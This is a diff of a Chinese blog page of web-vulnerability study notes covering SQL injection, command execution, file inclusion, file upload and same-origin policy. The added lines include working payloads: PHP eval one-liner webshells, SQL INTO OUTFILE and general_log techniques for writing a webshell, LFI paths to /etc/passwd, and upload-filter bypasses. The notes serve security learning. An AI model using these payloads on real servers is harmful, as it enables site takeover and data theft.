-<h3 id="1-1-SQL注入原理"><a href="#1-1-SQL注入原理" class="headerlink" title="1.1 SQL注入原理"></a>1.1 SQL注入原理</h3><h4 id="sql注入漏洞原理："><a href="#sql注入漏洞原理：" class="headerlink" title="sql注入漏洞原理："></a>sql注入漏洞原理：</h4><p>原理：所谓SQL注入，就是通过把<strong>恶意SQL语句</strong>插入到能与SQL服务器交互的WEB表单、http请求头等用户可控参数当中，再在后台<strong>与原SQL语句拼接</strong>，改变原先语法结构，最终<strong>被服务器执行</strong>。</p>
+        <h2 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h2><h3 id="1-1-SQL注入原理"><a href="#1-1-SQL注入原理" class="headerlink" title="1.1 SQL注入原理"></a>1.1 SQL注入原理</h3><h4 id="sql注入漏洞原理："><a href="#sql注入漏洞原理：" class="headerlink" title="sql注入漏洞原理："></a>sql注入漏洞原理：</h4><p>原理：所谓SQL注入，就是通过把<strong>恶意SQL语句</strong>插入到能与SQL服务器交互的WEB表单、http请求头等用户可控参数当中，再在后台<strong>与原SQL语句拼接</strong>，改变原先语法结构，最终<strong>被服务器执行</strong>。</p>
 <table>
 <thead>
 <tr>
@@ -521,7 +534,7 @@
 <p>2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算)，查询虚表，发现没有该键值，则会再计算一次floor(rand(0)*2)，将结果1(第二次计算)插入虚表，如下：</p>
 <p>3.查第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现键值1存在，所以此时不在计算第二次，直接count(*)值加1，如下：</p>
 <p>4.查第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算floor(rand(0)*2)，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。</p>
-<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508161815984.png" alt="image-20220508161815984"><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508161819166.png" alt="image-20220508161819166"><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508161823442.png" alt="image-20220508161823442"><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508161828399.png" alt="image-20220508161828399"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508161815984.png" alt="image-20220508161815984"><img src="/2022/06/15/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508161819166.png" alt="image-20220508161819166"><img src="/2022/06/15/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508161823442.png" alt="image-20220508161823442"><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508161828399.png" alt="image-20220508161828399"></p>
 <p><strong>Mysql特性：</strong></p>
 <p><strong>几何函数</strong></p>
 <p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，<strong>在版本号为5.5.47上可以用来注入，而在5.7.17上则不行</strong>：</p>
@@ -668,6 +681,26 @@
 <p><strong>黑名单白名单</strong></p>
 <p>5.采用sql语句<strong>预编译</strong> （order by / limit 处无法编译）</p>
 <p>先将查询语句固定 通过函数将传参变为字符串 拼接字符串去执行 你的关键字根本不会当作关键字去执行.</p>
+<h3 id="1-5-SQL注入写入webshell的条件和方法"><a href="#1-5-SQL注入写入webshell的条件和方法" class="headerlink" title="1.5 SQL注入写入webshell的条件和方法"></a>1.5 SQL注入写入webshell的条件和方法</h3><h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h4><p>1.secure_file_priv 支持数据导出。MySQL用secure_file_priv这个配置项来完成对数据导入导出的限制。如果secure_file_priv=NULL，MySQL服务会禁止导入和导出操作。通过命令查看secure-file-priv`的当前值，确认是否允许导入导出以及到处文件路径。</p>
+<p>2.当前数据库的用户拥有FILE权限能够写入(root权限)。</p>
+<p>3.当secure_file_priv文件导出路径与web目录路径重叠，写入Webshell才可以被访问到。</p>
+<p>4.知道网站目录的绝对路径。</p>
+<h4 id="写入："><a href="#写入：" class="headerlink" title="写入："></a><strong>写入：</strong></h4><p><strong>union select写入</strong></p>
+<p>outfile方法是mysql提供的一个用来写入文件的函数，当我们可以控制输入的文件和文件的保存路径时，就可以达到传入webshell的目的。当我们可以使用union查询时，就可以构造一个如下的语句：</p>
+<p><code>union select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;web目录&#39;;</code></p>
+<p><strong>分隔符写入</strong></p>
+<p>当union无法使用时，还可以利用分隔符写入：</p>
+<p><code>?id=1 INTO OUTFILE &#39;物理路径&#39; lines terminated by （&lt;?php eval($_POST[cmd])?&gt;）#</code></p>
+<p><code>?id=1 INTO OUTFILE &#39;物理路径&#39; fields terminated by （&lt;?php eval($_POST[cmd])?&gt;）#</code></p>
+<p><code>?id=1 INTO OUTFILE &#39;物理路径&#39; columns terminated by （&lt;?php eval($_POST[cmd])?&gt;）#</code></p>
+<p><code>?id=1 INTO OUTFILE &#39;物理路径&#39; lines starting by （&lt;?php eval($_POST[cmd])?&gt;）#</code></p>
+<p><strong>log写入</strong></p>
+<p>新版本的mysql在my.ini中设置了导出文件的路径，无法再使用select into outfile来写入一句话木马，这时我们可以通过修改MySQL的log文件来获取webshell。</p>
+<p><code>show variables like &#39;%general%&#39;;                     #查看配置</code></p>
+<p><code>set global general_log = on;                         #开启general log模式</code></p>
+<p><code>set global general_log_file = &#39;网站目录/shell.php&#39;;   #设置日志目录为shell地址</code></p>
+<p><code>select &#39;&lt;?php eval($_POST[shell]);?&gt;&#39;                #写入shell</code></p>
+<p><code>set global general_log=off;                          #关闭general log模式</code></p>
 <h2 id="二、命令执行"><a href="#二、命令执行" class="headerlink" title="二、命令执行"></a>二、命令执行</h2><h3 id="2-1-代码执行原理："><a href="#2-1-代码执行原理：" class="headerlink" title="2.1 代码执行原理："></a>2.1 代码执行原理：</h3><h4 id="代码执行原理："><a href="#代码执行原理：" class="headerlink" title="代码执行原理："></a>代码执行原理：</h4><p>代码执行是指应用程序在调用⼀些能够将字符串转换为代码的函数时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞，使得用户能利用任意脚本代码(PHP)。</p>
 <p>Webshell含义：</p>
 <p>webshell 就是以网页文件形式存在的一种命令/代码执行环境，也可以将其称做为一种网页后门。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。一句话木马、小马、大马都可以叫 webshell。</p>
@@ -858,19 +891,21 @@
 <p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220505194424277.png" alt="image-20220505194424277"></p>
 <h4 id="文件读取函数："><a href="#文件读取函数：" class="headerlink" title="文件读取函数："></a><strong>文件读取函数：</strong></h4><p>•show_source() 高亮显示文件内容</p>
 <p>•highlight_file() 高亮显示文件内容(别名)</p>
-<p>•readfile() 读取文件内容并输出</p>
+<p>•readfile() 读取 文件内容并输出</p>
 <p>•file_get_contents() 将文件读取为字符串</p>
 <p>•file() 将文件按行读取为数组</p>
 <h4 id="绝对路径与相对路径："><a href="#绝对路径与相对路径：" class="headerlink" title="绝对路径与相对路径："></a><strong>绝对路径与相对路径：</strong></h4><p>文件路径就是文件在电脑中的位置，表示文件路径的方式有两种，<strong>相对路径</strong>和<strong>绝对路径</strong>。在网页设计中通过路径可以表示链接，插入图像、CSS文件，或者用来读取、下载、包含文件。</p>
 <p>根目录：/    用户目录：~    网站根目录：WWW</p>
 <p>•绝对路径<br> /var/html/www/index.php<br> /etc/passwd<br> C:\phpStudy\PHPTutorial\WWW\flag</p>
 <p>•相对路径<br> ./index.php<br> ../../../../../../../etc/passwd<br> .\flag</p>
-<h4 id="漏洞产生位置："><a href="#漏洞产生位置：" class="headerlink" title="漏洞产生位置："></a>漏洞产生位置：</h4><p>读取/下载图片、文件内容；</p>
-<p>下载附件；</p>
+<h4 id="漏洞产生位置："><a href="#漏洞产生位置：" class="headerlink" title="漏洞产生位置："></a>漏洞产生位置：</h4><p>功能：</p>
+<p>读取/下载图片、文件内容；</p>
+<p>下载附件； </p>
 <p>预览文档；</p>
 <p>导出文档；</p>
-<p>修改、保存文档等</p>
-<p>删除文件、附件、图片、替换、配置等</p>
+<p>修改、保存文档等；</p>
+<p>删除文件、附件、图片、替换、配置等。</p>
+<p>位置：</p>
 <p>1.get传参、post传参</p>
 <p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220505200437275.png" alt="image-20220505200437275"></p>
 <p>2.网页内某些链接</p>
@@ -882,7 +917,7 @@
 <p>•读取服务器配置文件</p>
 <p>•读取日志文件</p>
 <p>•读取proc文件系统</p>
-<p>•… …</p>
+<p>•删除配置文件 </p>
 <h4 id="Linux系统配置文件："><a href="#Linux系统配置文件：" class="headerlink" title="Linux系统配置文件："></a>Linux系统配置文件：</h4><p>/etc/passwd 系统用户账号</p>
 <p>/etc/shadow 系统用户密码(加密处理后的）</p>
 <p>/etc/hosts ip地址与域名快速解析的文件</p>
@@ -906,42 +941,41 @@
 <p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220505201547026.png" alt="image-20220505201547026"></p>
 <p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，<strong>程序继续正常运行</strong>；而require函数出现错误的时候，会直接报错并<strong>退出程序的执行</strong>。</p>
 <p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数<strong>只包含一次</strong>，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
-<p>PHP中文件包含函数特点：</p>
-<p><strong>文件包含不需要考虑文件名是否为php</strong></p>
-<p>包含的文件当中，存在符合php语法的内容，则执行这些内容。</p>
-<p>包含的文件当中，不存在符合php语法的内容，则原封不动的输出这些内容</p>
+<p><strong>PHP中文件包含函数特点：</strong></p>
+<p>文件包含<strong>不需要考虑</strong>文件名是否为php。包含的文件当中，存在符合php语法的内容，则执行这些内容。包含的文件当中，不存在符合php语法的内容，则原封不动的输出这些内容。</p>
 <p>符合php语法的内容：</p>
 <p>从PHP脚本声明标签开始到结束</p>
-<?php phpinfo(); ?>
-
-<? phpinfo(); ?><p>（设置配置后才能开启）</p>
-<script language="php"> phpinfo(); </script>
-
-<p>（设置配置后才能开启）</p>
+<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
+<p><code>&lt;? phpinfo(); ?&gt;（设置配置后才能开启）</code></p>
+<p><code>&lt;script language=&#39;php&#39;&gt; phpinfo(); &lt;/script&gt;（设置配置后才能开启）</code></p>
 <p>?&gt;加不加都可以，不加的话会把后面的内容全部当做PHP代码执行。</p>
 <h3 id="3-3-文件包含利用"><a href="#3-3-文件包含利用" class="headerlink" title="3.3 文件包含利用"></a>3.3 文件包含利用</h3><h4 id="本地文件包含LFI："><a href="#本地文件包含LFI：" class="headerlink" title="本地文件包含LFI："></a>本地文件包含LFI：</h4><p>本地文件包含漏洞 LFI（Local File Inclusion），顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220505203435169.png" alt="image-20220505203435169"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220505203435169.png" alt="image-20220505203435169"></p>
 <h4 id="本地文件包含利用："><a href="#本地文件包含利用：" class="headerlink" title="本地文件包含利用："></a>本地文件包含利用：</h4><p>1.包含本地文件，读取敏感文件</p>
 <p>2.将shell写入日志，包含日志文件getshell</p>
 <p>3.将shell写入session文件，<strong>包含session文件getshell</strong></p>
 <p>4.结合PHP伪协议getshell</p>
 <p>5.结合文件上传getshell</p>
-<p>通常与文件上传结合getshell，如上传txt或者jpg等，在文件末尾加入一句话。结合文件包含漏洞，即可解析代码。</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220505203802495.png" alt="image-20220505203802495"></p>
-<p>如果环境为php且开启了session，可以尝试包含php的session文件。</p>
+<p>通常与文件上传结合getshell，如上传txt或者jpg等，在文件末尾加入一句话木马。结合文件包含漏洞，即可解析代码。</p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220505203802495.png" alt="image-20220505203802495"></p>
+<hr>
+<p>如果环境为php且<strong>开启了session</strong>，可以尝试包含php的session文件。</p>
 <p>默认情况下，php.ini 中设置的 SESSION 保存方式是 files（session.save_handler = files），即<strong>使用读写文件的方式保存 SESSION 数据</strong>，而 SESSION 文件保存的目录由 session.save_path 指定，文件名<strong>以 sess_ 为前缀，后跟 SESSION ID</strong>，如：sess_c72665af28a8b14c0fe11afe3b59b51b。文件中的数据即是序列化之后的 SESSION 数据了。</p>
 <p>Linux默认路径是储存在/tmp 或 /var/lib/php/sessions（受版本影响）</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.1.2/lesson/include/include.php?file=/Applications/MAMP/tmp/php/sess_fdcf5a5ae05368ba2b44ef0824b2e130">http://192.168.1.2/lesson/include/include.php?file=/Applications/MAMP/tmp/php/sess_fdcf5a5ae05368ba2b44ef0824b2e130</a></p>
-<p>文件路径可以再phpinfo()中查看</p>
-<p>通过session将数据存储到服务器上(webshell)，通过文件包含去包含session文件(getshell) </p>
-<p>包含apache、nginx、mysql、php日志getshell</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506160931141.png" alt="image-20220506160931141"></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506160950069.png" alt="image-20220506160950069"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="string">&#x27;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>文件路径可以在phpinfo()中查看</p>
+<p>技术路线：通过session将数据存储到服务器上(webshell)，通过文件包       含去包含session文件(getshell) 。</p>
+<hr>
+<p>包含apache、nginx、mysql、php日志getshell(要求开启日志)</p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506160931141.png" alt="image-20220506160931141"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506160950069.png" alt="image-20220506160950069"></p>
 <h4 id="远程文件包含利用："><a href="#远程文件包含利用：" class="headerlink" title="远程文件包含利用："></a>远程文件包含利用：</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON(默认关闭)，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506161235838.png" alt="image-20220506161235838"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506161235838.png" alt="image-20220506161235838"></p>
 <h3 id="3-4-PHP伪协议"><a href="#3-4-PHP伪协议" class="headerlink" title="3.4 PHP伪协议"></a>3.4 PHP伪协议</h3><h4 id="PHP伪协议："><a href="#PHP伪协议：" class="headerlink" title="PHP伪协议："></a>PHP伪协议：</h4><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 file() 、show_source() 、 fopen()、 copy()、 file_exists() filesize() 等等的文件系统函数，以及文件包含函数。在PHP的官方手册中，共有12种伪协议。</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506161325310.png" alt="image-20220506161325310"></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506161328615.png" alt="image-20220506161328615"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506161325310.png" alt="image-20220506161325310"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506161328615.png" alt="image-20220506161328615"></p>
 <p><strong>PHP默认配置：</strong></p>
 <p>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</p>
 <p>allow_url_include=Off(php5.2之后默认为Off) 规定是否允许include/require远程文件</p>
@@ -953,13 +987,13 @@
 <p><strong>http:// https://</strong> —— 允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。</p>
 <p><strong>phar://</strong> —— 可以访问zip、phar格式包内容</p>
 <p>php://filter = php://filter/read=convert.base64-encoed/resource=</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506162354044.png" alt="image-20220506162354044"></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506162357636.png" alt="image-20220506162357636"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506162354044.png" alt="image-20220506162354044"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506162357636.png" alt="image-20220506162357636"></p>
 <h4 id="PHP伪协议代码执行"><a href="#PHP伪协议代码执行" class="headerlink" title="PHP伪协议代码执行:"></a>PHP伪协议代码执行:</h4><p>需要开启 allow_url_include</p>
 <p>php://input:</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506162522151.png" alt="image-20220506162522151"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506162522151.png" alt="image-20220506162522151"></p>
 <p>data://:</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220506162530542.png" alt="image-20220506162530542"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220506162530542.png" alt="image-20220506162530542"></p>
 <h3 id="3-5-文件包含防御"><a href="#3-5-文件包含防御" class="headerlink" title="3.5 文件包含防御"></a>3.5 文件包含防御</h3><h4 id="漏洞防御："><a href="#漏洞防御：" class="headerlink" title="漏洞防御："></a>漏洞防御：</h4><p><strong>配置文件：</strong></p>
 <p>在配置文件中限制访问的文件目录，比如PHP中php.ini配置open_basedir</p>
 <p>尽量关闭allow_url_include配置</p>
@@ -992,12 +1026,9 @@
 <h2 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h2><h3 id="4-1-文件上传原理"><a href="#4-1-文件上传原理" class="headerlink" title="4.1 文件上传原理"></a>4.1 文件上传原理</h3><h4 id="文件上传原理："><a href="#文件上传原理：" class="headerlink" title="文件上传原理："></a>文件上传原理：</h4><p>由于对上传文件类型未过滤或过滤机制不严，导致恶意用户可以上传脚本文件，通过上传⽂件可达到控制网站权限的目的，该漏洞⼀般结合解析漏洞。 攻击者可获得网站控制权限（getshell）。</p>
 <p>网站WEB应用都有⼀些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门webshell。</p>
 <h4 id="后门-webshell"><a href="#后门-webshell" class="headerlink" title="后门 webshell:"></a><strong>后门 webshell:</strong></h4><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为⼀种网页后门。黑客在入侵了一个网站后，通常会将asp或php等后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问后门webshell，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
-<?php @eval($_GET['a']); ?>
-
-<?php @assert($_POST['a']); ?>
-
-<?php @$_POST['fun']($_POST['a']);?>
-
+<p><code>&lt;?php @eval($_GET[&#39;a&#39;]); ?&gt;</code></p>
+<p><code>&lt;?php @assert($_POST[&#39;a&#39;]); ?&gt;</code></p>
+<p><code>&lt;?php @$_POST[&#39;fun&#39;]($_POST[&#39;a&#39;]);?&gt;</code></p>
 <h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a><strong>利用条件：</strong></h4><p>1.有上传功能</p>
 <p>2.知道文件上传后的路径</p>
 <p>3.上传后的文件可以访问</p>
@@ -1009,12 +1040,12 @@
 <p>·text/plain 文本类型</p>
 <p>·image/jpeg 图片格式</p>
 <p>·application/octet-stream 脚本类型</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508230830306.png" alt="image-20220508230830306"></p>
-<h4 id="PHP文件上传："><a href="#PHP文件上传：" class="headerlink" title="PHP文件上传："></a><strong>PHP文件上传：</strong></h4><p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508231014727.png" alt="image-20220508231014727"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508230830306.png" alt="image-20220508230830306"></p>
+<h4 id="PHP文件上传："><a href="#PHP文件上传：" class="headerlink" title="PHP文件上传："></a><strong>PHP文件上传：</strong></h4><p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508231014727.png" alt="image-20220508231014727"></p>
 <h3 id="4-2-文件上传检测"><a href="#4-2-文件上传检测" class="headerlink" title="4.2 文件上传检测"></a>4.2 文件上传检测</h3><h4 id="文件上传检测："><a href="#文件上传检测：" class="headerlink" title="文件上传检测："></a>文件上传检测：</h4><p>针对与文件上传，主要分为客户端检测与服务端检测，而客户端检测可以轻易绕过，且服务端检测的方式多种多样，所以文件上传WAF多针对服务端检测。</p>
 <p>客户端、服务端，上传、接受文件demo：</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508231057114.png" alt="image-20220508231057114"></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508231100874.png" alt="image-20220508231100874"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508231057114.png" alt="image-20220508231057114"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508231100874.png" alt="image-20220508231100874"></p>
 <p><strong>客户端javascript校验</strong></p>
 <p>校验文件后缀名</p>
 <p><strong>服务端校验</strong></p>
@@ -1030,27 +1061,27 @@
 <p>5.图片裁剪</p>
 <h3 id="4-3-文件上传绕过"><a href="#4-3-文件上传绕过" class="headerlink" title="4.3 文件上传绕过"></a>4.3 文件上传绕过</h3><h4 id="客户端验证绕过："><a href="#客户端验证绕过：" class="headerlink" title="客户端验证绕过："></a>客户端验证绕过：</h4><p>Upload-labs Pass - 01</p>
 <p><strong>Javascript验证后缀名</strong>：1.禁用js（F12 F1 停用js）2.抓包修改后缀名</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508231710257.png" alt="image-20220508231710257"></p>
+<p><img src="/2022/06/15/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508231710257.png" alt="image-20220508231710257"></p>
 <h4 id="服务端验证绕过："><a href="#服务端验证绕过：" class="headerlink" title="服务端验证绕过："></a>服务端验证绕过：</h4><p>Upload-labs Pass - 02</p>
 <p><strong>MIME检测：</strong>1.上传php文件，抓包修改content-type 2.上传图片格式文件，抓包修改文件后缀名</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508232923973.png" alt="image-20220508232923973"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508232923973.png" alt="image-20220508232923973"></p>
 <p><strong>文件幻数检测：</strong>上传php的文件前面加入图片的幻术头</p>
 <p>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508232952151.png" alt="image-20220508232952151"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508232952151.png" alt="image-20220508232952151"></p>
 <p><strong>PHP脚本标签检测：</strong></p>
 <p>1.PHP 短标签 <? ?></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508233039386.png" alt="image-20220508233039386"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508233039386.png" alt="image-20220508233039386"></p>
 <p>2.PHP js风格标签 <script language="php"></script></p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508233053903.png" alt="image-20220508233053903"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508233053903.png" alt="image-20220508233053903"></p>
 <p><strong>后缀名黑名单：</strong></p>
 <p>1.后缀名大小写绕过 Upload-labs Pass - 06</p>
 <p>2.php别名：php2, php3, php4, php5, phps, pht, phtm, phtml Upload-labs Pass - 03</p>
 <p>3.配合”.htaccess”、”.user.ini”绕过</p>
 <p>AddType application/x-httpd-php .php .phtml</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508233145288.png" alt="image-20220508233145288"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508233145288.png" alt="image-20220508233145288"></p>
 <p><strong>.htaccess：</strong></p>
 <p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即Apache在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220508233215250.png" alt="image-20220508233215250"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220508233215250.png" alt="image-20220508233215250"></p>
 <p><strong>.user.ini：</strong></p>
 <p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。</p>
 <p>利用条件：</p>
@@ -1131,10 +1162,10 @@
 <p>cookie在客户端的限制是3K。</p>
 <p>session保存在服务端会占用性能，如果主要考虑到减轻服务器性能方面，应当使用COOKIE。</p>
 <h3 id="5-2-跨域请求"><a href="#5-2-跨域请求" class="headerlink" title="5.2 跨域请求"></a>5.2 跨域请求</h3><h4 id="同源策略："><a href="#同源策略：" class="headerlink" title="同源策略："></a>同源策略：</h4><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由URL决定，URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型（DOM）访问另一网页上的敏感数据。</p>
-<p><img src="/2022/07/22/Web%E6%BC%8F%E6%B4%9E/Users\10713\AppData\Roaming\Typora\typora-user-images\image-20220509160657254.png" alt="image-20220509160657254"></p>
+<p><img src="https://xsbxx-picture.oss-cn-hangzhou.aliyuncs.com/typora-img/image-20220509160657254.png" alt="image-20220509160657254"></p>
 <p><strong>file同源：</strong>域名或IP地址、子域名、端口、协议。</p>
 <p><strong>Cookie同源：</strong>不管使用哪个协议(HTTP/HTTPS)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 domain / path / secure 和 http-only 标记来限定其访问性。所以 <a target="_blank" rel="noopener" href="https://localhost:8080/">https://localhost:8080/</a> 和 <a target="_blank" rel="noopener" href="http://localhost:8081/">http://localhost:8081/</a> 的Cookie是共享的。</p>
